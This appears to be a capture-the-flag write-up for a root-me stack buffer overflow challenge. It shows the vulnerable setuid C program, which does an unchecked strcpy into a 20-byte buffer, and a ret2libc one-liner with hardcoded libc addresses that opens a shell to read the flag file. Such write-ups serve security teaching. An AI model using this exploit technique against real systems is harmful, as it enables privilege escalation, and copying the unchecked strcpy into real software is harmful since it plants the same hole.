# ELF x86: Stack buffer overflow basic 6

[root-me challenge](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-6): 

Environment configuration:

```text
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes  
```

Source code:

```text
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
 
int main (int argc, char ** argv){
    char message[20];
 
    if (argc != 2){
        printf ("Usage: %s <message>\n", argv[0]);
        return -1;
    }
 
    setreuid(geteuid(), geteuid());
    strcpy (message, argv[1]);
    printf ("Your message: %s\n", message);
    return 0;
}
```
----

```text
app-systeme-ch33@challenge02:~$ ./ch33 `python -c "print 'A'*32 + '\x10\x33\xe6\xb7' + 'DDDD' + '\x4c\x5d\xf8\xb7'"`
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�3��DDDDL]��
```

```text
$ cat .passwd
```

## Resources

* [François Boisson : Buffer Overflow ou explication de "une faille de type bufferoverflow"](https://www.youtube.com/watch?v=u-OZQkv2ebw)
* [Linux exploit development part 3 - ret2libc](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%203%20Linux%20exploit%20development%20part%203%20-%20ret2libc.pdf)
